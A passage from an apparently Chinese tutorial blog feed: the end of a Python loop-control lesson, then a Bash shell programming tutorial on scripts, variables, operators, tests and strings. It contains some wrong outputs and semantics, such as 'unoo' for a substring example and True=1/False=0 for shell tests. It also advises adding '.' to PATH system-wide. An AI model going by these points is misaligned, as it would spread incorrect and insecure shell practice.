<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):  <span class="comment">#控制每行个数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; *&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>) </span><br></pre></td></tr></table></figure>
<h4 id="循环控制语句说明"><strong>循环控制语句说明</strong></h4>
<p>如果在某一时刻（在不满足结束条件的情况下）想提前结束循环，可以使用break或continue关键字；</p>
<p><strong>循环控制语句-break</strong></p>
<p>当break关键字用于for循环时，会终止循环而执行整个循环语句后面的代码信息；break 退出的是循环 exit() 或者quit() 退出的是脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>循环控制语句-continue</strong></p>
<p>不同于break退出整个循环，continue指的退出当次循环，但会继续在循环结构中，完成后续的循环操作；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        流程循环语句练习
    </div>
    <div class="spoiler-content">
        <p>循环控制语句练习-01：猜水果价格小游戏</p>
<p>一个水果摊，老板卖水果，你去猜水果价格，当你说出价格后，老板会告诉你大小；</p>
<p>如果猜高了，就会告诉你猜高了；</p>
<p>如果猜低了，就告诉你你猜低了；</p>
<p>直到猜对为止，并在猜对后，会输出一共猜了几次。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    rannum = random.randint(<span class="number">1</span>,<span class="number">20</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请出价猜水果价格：答案是1到20之间整数&quot;</span>)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt;=<span class="number">5</span>:</span><br><span class="line">        num = <span class="built_in">input</span>(<span class="string">&quot;你还有&#123;0&#125;次机会，\n请输入一个1到20的整数: &quot;</span>.<span class="built_in">format</span>(<span class="number">5</span>-count))</span><br><span class="line">        <span class="keyword">if</span> num.isdigit():</span><br><span class="line">            num =<span class="built_in">int</span>(num)</span><br><span class="line">            <span class="keyword">if</span> num == rannum:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;恭喜你，答对了!&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> num &gt; rannum:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;猜的有点大&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> num &lt; rannum:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;猜的有点小&quot;</span>)</span><br><span class="line">            count = count +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入一个整数&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;给了你&quot;</span>,count,<span class="string">&quot;次机会都没答对，正确的答案是：&quot;</span>,rannum,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;怎么样，这游戏好玩吧？&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;按任意键结束游戏，按空格键继续游戏：&quot;</span>)</span><br><span class="line">    select = <span class="built_in">input</span>(<span class="string">&quot;请输入你的选择：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> select != <span class="string">&quot; &quot;</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

    </div>
</div>
<h2 id="编程函数"><strong>编程函数</strong></h2>
<p>函数定义语法格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">函数名</span>(<span class="params">var1,var2...varn</span>):</span><br><span class="line">    操作指令信息</span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>【Linux】shell编程</title>
    <url>/posts/63063238/</url>
    <content><![CDATA[<h2 id="shell编程">shell编程</h2>
<p>这里说的Shell 脚本（shell script），是在Linux 环境下运行的脚本程序</p>
<p>Shell 编程跟 JavaScript、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。</p>
<p>Linux 的 Shell 种类众多，常见的有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Bourne Shell（/usr/bin/sh或/bin/sh）</p>
</li>
<li class="lvl-2">
<p>Bourne Again Shell（/bin/bash）</p>
</li>
<li class="lvl-2">
<p>C Shell（/usr/bin/csh）</p>
</li>
<li class="lvl-2">
<p>K Shell（/usr/bin/ksh）</p>
</li>
<li class="lvl-2">
<p>Shell for Root（/sbin/sh）</p>
</li>
<li class="lvl-2">
<p>……</p>
</li>
</ul>
<p>Bash是大多数Linux 系统默认的 Shell，本文也仅关注Bash Shell。</p>
<p>在一般情况下，并不区分 Bourne Shell 和 Bourne Again Shell，所以，像 <strong>#!/bin/sh</strong>，它同样也可以改为 <strong>#!/bin/bash</strong>。</p>
<p><strong>#!</strong> 告诉系统其后路径所指定的程序即是解释此脚本文件的 Shell 程序。</p>
<span id="more"></span>
<h2 id="入门">入门</h2>
<h3 id="运行Shell脚本">运行Shell脚本</h3>
<p>编写shell脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi test.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello World !&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>#!</strong> 是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。</p>
<p>echo 命令用于向窗口输出文本。</p>
<p>运行 Shell 脚本有两种方法：</p>
<p><strong>1、作为可执行程序</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ./test.sh  <span class="comment">#使脚本具有执行权限</span></span><br><span class="line">./test.sh  <span class="comment">#执行脚本</span></span><br></pre></td></tr></table></figure>
<p>默认情况下，一定要写成 <strong>./test.sh</strong>，而不是 <strong><a href="http://test.sh">test.sh</a></strong>，运行其它二进制的程序也一样。</p>
<p>除非将当前目录.加入到PATH环境变量中，配置方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vi /etc/profile</span><br><span class="line">加入一行</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:.</span><br><span class="line">保存之后，执行</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
<p><strong>2、作为解释器参数</strong></p>
<p>直接运行解释器，其参数就是 shell 脚本的文件名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh test.sh</span><br></pre></td></tr></table></figure>
<p>这种方式运行的脚本，不需要在第一行指定解释器信息，写了也没用。</p>
<h3 id="编写一个快捷创建shell脚本的命令">编写一个快捷创建shell脚本的命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -z <span class="variable">$1</span>;<span class="keyword">then</span></span><br><span class="line">  newfile=<span class="string">&quot;./script_`date +%m%d_%s`&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  newfile=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newfile</span></span><br><span class="line"><span class="keyword">if</span>  ! grep <span class="string">&quot;^#!&quot;</span> <span class="variable">$newfile</span> &amp;&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; <span class="variable">$newfile</span> &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string"># Author:</span></span><br><span class="line"><span class="string"># Date &amp; Time: `date +&quot;%F %T&quot;`</span></span><br><span class="line"><span class="string">#Description:</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">vim +5 <span class="variable">$newfile</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="variable">$newfile</span></span><br></pre></td></tr></table></figure>
<p>将以上内容编写好之后保存为shell文件，然后执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x shell</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> shell /usr/bin/</span><br></pre></td></tr></table></figure>
<h2 id="Shell变量">Shell变量</h2>
<h3 id="变量类型">变量类型</h3>
<p>运行shell时，会同时存在三种变量：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>1) 普通变量（局部变量）</strong>： 系统中满足特定调用需求的配置信息，并且可能随时会发生调整变化的参数。局部变量在脚本或命令中定义，仅在当前shell实例中有效，其他shell启动的程序不能访问局部变量。</p>
</li>
<li class="lvl-2">
<p><strong>2) 环境变量（全局变量）</strong> ：系统中默认已经存在，可以进行修改调整，所有的程序，包括shell启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候shell脚本也可以定义环境变量。可以在<code>/etc/profile</code>中修改环境变量。</p>
</li>
<li class="lvl-2">
<p><strong>3) shell变量</strong>： shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了shell的正常运行</p>
</li>
</ul>
<p>环境变量 vs 普通变量特点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>变量信息在系统中默认已经存在</p>
</li>
<li class="lvl-2">
<p>变量信息名称设置为大写字母</p>
</li>
<li class="lvl-2">
<p>变量功能配置对系统中全部用户生效</p>
</li>
<li class="lvl-2">
<p>变量的设置会对系统功能有一定影响</p>
</li>
</ul>
<h3 id="定义变量">定义变量</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&quot;taobao.com&quot;</span></span><br></pre></td></tr></table></figure>
<p>可以用单引号（所见即所得） 双引号（可以识别变量） 反引号（可以执行命令）。不加引号进行变量值引用，推荐字符用双引号 数字不加引号。</p>
<p>变量名的命名须遵循如下规则：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。</p>
</li>
<li class="lvl-2">
<p>中间不能有空格，可以使用下划线（_）。</p>
</li>
<li class="lvl-2">
<p>不能使用标点符号。</p>
</li>
<li class="lvl-2">
<p>不能使用bash里的关键字（可用help命令查看保留关键字）。</p>
</li>
</ul>
<h3 id="使用变量">使用变量</h3>
<p>在变量名前面加美元符号即可，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&quot;qinjx&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$your_name</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;your_name&#125;</span></span><br></pre></td></tr></table></figure>
<p>加花括号可以帮助解释器识别变量的边界，比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> skill <span class="keyword">in</span> Ada Coffe Action Java; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;I am good at <span class="variable">$&#123;skill&#125;</span>Script&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="只读变量">只读变量</h3>
<p>使用 readonly 命令可以将变量定义为只读变量，只读变量的值不能被改变。</p>
<p>下面的例子尝试更改只读变量，结果报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/shell$ myUrl=<span class="string">&quot;http://www.google.com&quot;</span></span><br><span class="line">python@ubuntu:~/shell$ <span class="built_in">readonly</span> myUrl</span><br><span class="line">python@ubuntu:~/shell$ myUrl=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">-bash: myUrl: 只读变量</span><br></pre></td></tr></table></figure>
<h3 id="删除变量">删除变量</h3>
<p>使用 unset 命令可以删除变量，但不能删除只读变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">myUrl=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="built_in">unset</span> myUrl</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$myUrl</span></span><br></pre></td></tr></table></figure>
<h2 id="Shell算术运算符">Shell算术运算符</h2>
<p>下表列出了常用的算术运算符，假定变量 a 为 10，变量 b 为 20：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>加法</td>
<td><code>expr $a + $b</code> 结果为 30。</td>
</tr>
<tr>
<td>-</td>
<td>减法</td>
<td><code>expr $a - $b</code> 结果为 -10。</td>
</tr>
<tr>
<td>*</td>
<td>乘法</td>
<td><code>expr $a \* $b</code> 结果为 200。\</td>
</tr>
<tr>
<td>**</td>
<td>幂运算</td>
<td><code>expr $a ** $b</code></td>
</tr>
<tr>
<td>/</td>
<td>除法</td>
<td><code>expr $b / $a</code> 结果为 2。</td>
</tr>
<tr>
<td>%</td>
<td>取余</td>
<td><code>expr $b % $a</code> 结果为 0。</td>
</tr>
<tr>
<td>=</td>
<td>赋值</td>
<td>a=$b 将把变量 b 的值赋给 a。</td>
</tr>
<tr>
<td>|</td>
<td>或</td>
<td>按位或</td>
</tr>
<tr>
<td>&amp;</td>
<td>与</td>
<td>按位与</td>
</tr>
<tr>
<td>^</td>
<td>异或</td>
<td>按位异或</td>
</tr>
</tbody>
</table>
<p>shell脚本变量数值运算可以用以下四种方法</p>
<table>
<thead>
<tr>
<th>变量和变量运算</th>
<th>变量和数值运算</th>
<th>数值和数值运算</th>
</tr>
</thead>
<tbody>
<tr>
<td>sum=$[$a+$b]</td>
<td>a=$[$a+1]</td>
<td>r=$[ 2 * 3 ]</td>
</tr>
<tr>
<td>sum=$(($a+$b))<br>((sum=a+b))</td>
<td>a=$(($a+1))</td>
<td>r=$(( 2 * 3 ))</td>
</tr>
<tr>
<td>sum=`expr $a + $b`</td>
<td>a=`expr $a + 1`</td>
<td>r=`expr 2\ * 3`<br>r=`expr 4/2`</td>
</tr>
<tr>
<td>let sum=a+b</td>
<td>let a=a+1或<br>let a+=1</td>
<td>let r=2*3</td>
</tr>
</tbody>
</table>
<p>expr 是一款表达式计算工具，使用它能完成表达式的求值操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">val=`<span class="built_in">expr</span> 2 + 2`</span><br></pre></td></tr></table></figure>
<p>两点注意：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>表达式和运算符之间要有空格，例如 2+2 是不对的，必须写成 2 + 2。</p>
</li>
<li class="lvl-2">
<p>完整的表达式要被 ` ` 包含，这个字符是<strong>反引号</strong>在 Esc 键下边。</p>
</li>
<li class="lvl-2">
<p>乘号(*)前边必须加反斜杠<code>\</code>才能实现乘法运算；</p>
</li>
<li class="lvl-2">
<p>在 MAC 中 shell 的 expr 语法是：<strong>$((表达式))</strong>，此处表达式中的 “*” 不需要转义符号 <code>\</code> 。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">let</span> varName=算术表达式</span><br><span class="line">varName=$[算术表达式]</span><br><span class="line">varName=$((算术表达式))</span><br></pre></td></tr></table></figure>
<h2 id="Shell判断语句"><strong>Shell判断语句</strong></h2>
<h3 id="条件语句形式"><strong>条件语句形式</strong></h3>
<table>
<thead>
<tr>
<th><strong>序号</strong></th>
<th style="text-align:center"><strong>表达式形式</strong></th>
<th><strong>使用说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td style="text-align:center">[ &lt;测试表达式&gt; ]</td>
<td>通过单中括号进行条件测试表达式书写；单中括号的边界和内容之间至少有一个空格</td>
</tr>
<tr>
<td>02</td>
<td style="text-align:center">[[ &lt;测试表达式&gt; ]]</td>
<td>通过双中括号进行条件测试表达式书写；双中括号的边界和内容之间至少有一个空格</td>
</tr>
<tr>
<td>03</td>
<td style="text-align:center">((&lt;测试表达式&gt;))</td>
<td>通过双小括号进行条件测试表达式书写；双小括号的边界和内容之间无需有空格</td>
</tr>
</tbody>
</table>
<p><font class="notice">注：注意表达形式<code>[]</code>和<code>[[]]</code>之间的空格，如果没有空格则会报错，<code>[[s</code>会被当做命令执行</font></p>
<p>在条件测试判断时，会根据布尔类型数值进行判断条件真与假的关系：</p>
<table>
<thead>
<tr>
<th><strong>条件</strong></th>
<th><strong>数值表示</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>True</td>
<td>1</td>
<td>表示判断结果为真，判断的条件表达式成立</td>
</tr>
<tr>
<td>False</td>
<td>0</td>
<td>表示判断结果为假，判断的条件表达式不成立</td>
</tr>
</tbody>
</table>
<p>echo $? （特殊 0表示成功 其他表示失败）可以判断上一个命令是否执行成功，脚本、命令行都可以进行逻辑判断。</p>
<p>根据expr操作命令的返回值进行判断，$? 返回值为0表示命令执行成功，非0表示执行失败错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">expr</span> <span class="variable">$num1</span> + <span class="variable">$num2</span> + 1 &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;你输入的数字有的不是整数，请重新输入&quot;</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h3 id="关系运算符"><strong>关系运算符</strong></h3>
<p>关系运算符只支持数字，不支持字符串，除非字符串的值是数字。</p>
<p>双小括号 ”(())” 的作用是进行数值运算与数值比较，它的效率很高，用法灵活，是企业场景运维人员经常采用的运算操作符；</p>
<p>下表列出了常用的关系运算符，假定变量 a 为 10，变量 b 为 20：</p>
<table>
<thead>
<tr>
<th>运算符（<code>[]</code>中）</th>
<th>运算符（<code>[[]]</code>、<code>(())</code>中）</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>-eq</td>
<td>==</td>
<td>相等</td>
<td><code>[ $a -eq $b ]</code> 返回 false。</td>
</tr>
<tr>
<td>-ne</td>
<td>!=</td>
<td>不相等</td>
<td><code>[ $a -ne $b ]</code> 返回 true。</td>
</tr>
<tr>
<td>-gt</td>
<td>&gt;</td>
<td>大于</td>
<td><code>[ $a -gt $b ]</code> 返回 false。</td>
</tr>
<tr>
<td>-lt</td>
<td>&lt;</td>
<td>小于</td>
<td><code>[ $a -lt $b ]</code> 返回 true。</td>
</tr>
<tr>
<td>-ge</td>
<td>$a&gt;$b || $a=$b</td>
<td>大于等于</td>
<td><code>[ $a -ge $b ]</code>返回 false。</td>
</tr>
<tr>
<td>-le</td>
<td>$a&lt;$b || $a=$b</td>
<td>小于等于</td>
<td><code>[ $a -le $b ]</code> 返回 true。</td>
</tr>
</tbody>
</table>
<p>“=” 和 “!=” 也可在<code>[]</code>中做比较使用，但在<code>[]</code>中使用包含“&gt;”和“&lt;”的符号时，需要用反斜线转义</p>
<p>也可以在<code>[[]]</code>中使用包含 ”-gt” 和 ”-lt” 的符号 比较符号两端也要有空格</p>
<h3 id="逻辑操作符"><strong>逻辑操作符</strong></h3>
<p>以下介绍 Shell 的逻辑运算符，假定变量 a 为 10，变量 b 为 20:</p>
<table>
<thead>
<tr>
<th><code>[]</code>运算符</th>
<th><code>[[]]</code>运算符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td>&amp;&amp;</td>
<td>逻辑的 AND</td>
<td><code>[[ $a -lt 100 &amp;&amp; $b -gt 100 ]]</code> 返回 false</td>
</tr>
<tr>
<td>-o</td>
<td>||</td>
<td>逻辑的 OR</td>
<td>`[[ $a -lt 100</td>
</tr>
<tr>
<td>!</td>
<td>!</td>
<td>逻辑的NOT</td>
<td><code>[[ ! $a -lt 100 ]]</code> 返回false</td>
</tr>
</tbody>
</table>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ 条件1 ] -a [ 条件2 ]</span><br><span class="line">[[ 条件1 ]] &amp;&amp; [[ 条件2 ]]</span><br><span class="line">((条件<span class="number">1</span>)) &amp;&amp; ((条件<span class="number">2</span>))</span><br><span class="line">[ ! 条件 ] </span><br></pre></td></tr></table></figure>
<h3 id="字符串运算符">字符串运算符</h3>
<p>下表列出了常用的字符串运算符，假定变量 a 为 “abc”，变量 b 为 “efg”：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>检测两个字符串是否相等，相等返回 true。</td>
<td><code>[ $a = $b ]</code> 返回 false。</td>
</tr>
<tr>
<td>!=</td>
<td>检测两个字符串是否相等，不相等返回 true。</td>
<td><code>[ $a != $b ]</code> 返回 true。</td>
</tr>
<tr>
<td>-z</td>
<td>检测字符串长度是否为0，为0返回 true。</td>
<td><code>[ -z $a ]</code> 返回 false。</td>
</tr>
<tr>
<td>-n</td>
<td>检测字符串长度是否为0，不为0返回 true。</td>
<td><code>[ -n &quot;$a&quot; ]</code> 返回 true。</td>
</tr>
<tr>
<td>$</td>
<td>检测字符串是否为空，不为空返回 true。</td>
<td><code>[ $a ]</code> 返回 true。</td>
</tr>
<tr>
<td>&gt;</td>
<td>判断字符相同顺位的字符大小，常使用<code>[[]]</code></td>
<td><code>[[ $a &gt; $b ]]</code>返回false</td>
</tr>
<tr>
<td>&lt;</td>
<td>判断字符相同顺位的字符大小，常使用<code>[[]]</code></td>
<td><code>[[ $a &lt; $b ]]</code>返回true</td>
</tr>
<tr>
<td>=~</td>
<td>匹配正则表达式通，常使用<code>[[]]</code></td>
<td><code>[[ $a =~ \b[a-z]*\b ]]</code>返回true</td>
</tr>
</tbody>
</table>
<h3 id="文件检测运算符">文件检测运算符</h3>
<p>文件测试运算符用于检测 Unix 文件的各种属性。</p>
<p>属性检测描述如下：</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>-f file</td>
<td>检测文件是否是普通文件（既不是目录，也不是设备文件）</td>
<td>[ -f $file ]</td>
</tr>
<tr>
<td>-d file</td>
<td>检测文件是否是目录</td>
<td>[ -d $file ]</td>
</tr>
<tr>
<td>-e file</td>
<td>检测文件（包括目录）是否存在</td>
<td>[ -e $file ]</td>
</tr>
<tr>
<td>-b file</td>
<td>检测文件是否是块设备文件</td>
<td>[ -b $file ]</td>
</tr>
<tr>
<td>-c file</td>
<td>检测文件是否是字符设备文件</td>
<td>[ -c $file ]</td>
</tr>
<tr>
<td>-g file</td>
<td>检测文件是否设置了 SGID 位</td>
<td>[ -g $file ]</td>
</tr>
<tr>
<td>-k file</td>
<td>检测文件是否设置了粘着位(Sticky Bit)</td>
<td>[ -k $file ]</td>
</tr>
<tr>
<td>-u file</td>
<td>检测文件是否设置了 SUID 位</td>
<td>[ -u $file ]</td>
</tr>
<tr>
<td>-r file</td>
<td>检测文件是否可读</td>
<td>[ -r $file ]</td>
</tr>
<tr>
<td>-w file</td>
<td>检测文件是否可写</td>
<td>[ -w $file ]</td>
</tr>
<tr>
<td>-x file</td>
<td>检测文件是否可执行</td>
<td>[ -x $file ]</td>
</tr>
<tr>
<td>-p file</td>
<td>检测文件是否是有名管道</td>
<td>[ -p $file ]</td>
</tr>
<tr>
<td>-s file</td>
<td>检测文件是否不为空（文件大小是否大于0）</td>
<td>[ -s $file ]</td>
</tr>
<tr>
<td>-S file</td>
<td>判断某文件是否 socket。</td>
<td>[ -S $file ]</td>
</tr>
<tr>
<td>-L file</td>
<td>检测文件是否存在并且是一个符号链接。</td>
<td>[ -L $file ]</td>
</tr>
</tbody>
</table>
<h2 id="shell数据类型">shell数据类型</h2>
<h3 id="字符串">字符串</h3>
<p>字符串可以用单引号，也可以用双引号，也可以不用引号。</p>
<p>单引号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&#x27;this is a string&#x27;</span>b</span><br></pre></td></tr></table></figure>
<p>单引号字符串的限制：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；</p>
</li>
<li class="lvl-2">
<p>单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。</p>
</li>
</ul>
<p>双引号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&#x27;taobao&#x27;</span></span><br><span class="line">str=<span class="string">&quot;Hello, I know you are \&quot;<span class="variable">$your_name</span>\&quot;! \n&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="variable">$str</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果为：</span></span><br><span class="line">Hello, I know you are <span class="string">&quot;taobao&quot;</span>! </span><br></pre></td></tr></table></figure>
<p>双引号的优点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>双引号里可以有变量</p>
</li>
<li class="lvl-2">
<p>双引号里可以出现转义字符</p>
</li>
</ul>
<p>拼接字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&quot;taobao&quot;</span></span><br><span class="line"><span class="comment"># 使用双引号拼接</span></span><br><span class="line">greeting=<span class="string">&quot;hello, &quot;</span><span class="variable">$your_name</span><span class="string">&quot; !&quot;</span>     <span class="comment">#双引号外可以不加&quot;&#123;&#125;&quot;</span></span><br><span class="line">greeting_1=<span class="string">&quot;hello, <span class="variable">$&#123;your_name&#125;</span> !&quot;</span>   <span class="comment">#双引号内加&quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$greeting</span>  <span class="variable">$greeting_1</span></span><br><span class="line"><span class="comment"># 使用单引号拼接</span></span><br><span class="line">greeting_2=<span class="string">&#x27;hello, &#x27;</span><span class="variable">$your_name</span><span class="string">&#x27; !&#x27;</span></span><br><span class="line">greeting_3=<span class="string">&#x27;hello, $&#123;your_name&#125; !&#x27;</span>   <span class="comment">#单引号内原来是啥就是啥</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$greeting_2</span>  <span class="variable">$greeting_3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果为：</span></span><br><span class="line">hello, taobao ! hello, taobao !</span><br><span class="line">hello, taobao ! hello, <span class="variable">$&#123;your_name&#125;</span> !</span><br></pre></td></tr></table></figure>
<p><strong>获取字符串长度<code>$&#123;#s&#125;</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string=<span class="string">&quot;abcd&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span> <span class="comment">#输出 4</span></span><br></pre></td></tr></table></figure>
<p><strong>截取字符串${s:n1:n2}</strong></p>
<p>以下实例从字符串第 <strong>2</strong> 个字符开始截取 <strong>4</strong> 个字符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string=<span class="string">&quot;taobao is a great site&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;string:1:4&#125;</span> <span class="comment"># 输出 unoo</span></span><br></pre></td></tr></table></figure>
<p><strong>查找字符出现的位置<code>expr index</code></strong></p>
<p>查找字符 <strong>i</strong> 或 <strong>o</strong> 的位置(哪个字母先出现就计算哪个)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string=<span class="string">&quot;taobao is a great site&quot;</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> index <span class="string">&quot;<span class="variable">$string</span>&quot;</span> io`  <span class="comment"># 输出 3</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong> 以上脚本中 <strong>`</strong> 是反引号，而不是单引号 <strong>'</strong>。</p>
<h3 id="数组">数组</h3>
<p>bash支持一维数组（不支持多维数组），并且没有限定数组的大小。</p>
<p>数组元素的下标由 0 开始编号。</p>
<h4 id="定义数组">定义数组</h4>
<p>在 Shell 中，用括号来表示数组，数组元素用&quot;空格&quot;符号分割开。可以不使用连续的下标，而且下标的范围没有限制。</p>
<p>数组的定义方法：</p>
